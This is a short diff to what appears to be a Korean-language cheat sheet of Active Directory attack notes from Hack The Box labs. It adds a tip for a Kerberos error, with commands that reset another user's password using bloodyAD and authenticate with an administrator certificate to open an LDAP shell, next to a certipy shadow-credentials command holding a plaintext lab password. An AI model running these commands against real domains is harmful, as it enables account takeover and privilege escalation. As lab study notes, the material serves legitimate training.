@@ -862,8 +862,12 @@ certipy shadow auto -u ryan@sequel.htb -p WqSZAF6CysDQbGb3 -account 'ca_svc' -dc
 
 ## KDC_ERR_PADATA_TYPE_NOSUPP(KDC has no support for padata type)
 - 해당 오류가 발생하여 `certipy-ad`가 제대로 실행이 되지 않으면 `bloodyAD`를 사용하여 비밀번호 변경 시도.
+- 혹은 `ldap-shell` 옵션 사용해보기.
 ```bash
 bloodyAD -d tombwatcher.htb -u sam -p password --host dc01.tombwatcher.htb set password john password
+```
+```bash
+certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.234.44 -ldap-shell
 ```
   
 </details>
